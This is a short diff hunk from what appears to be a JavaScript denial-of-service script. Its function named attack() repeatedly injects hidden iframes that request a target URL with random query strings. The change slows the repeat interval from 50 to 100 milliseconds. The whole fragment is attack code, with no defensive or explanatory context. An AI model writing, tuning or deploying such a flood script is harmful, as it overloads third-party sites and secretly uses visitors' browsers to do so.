@@ -6,4 +6,4 @@ function attack() {
     
     document.body.innerHTML+='<iframe src="'+target+"/?r="+rand+'" style="display:none;"></iframe>';
 }
-setInterval(attack, 50);  
+setInterval(attack, 100);  
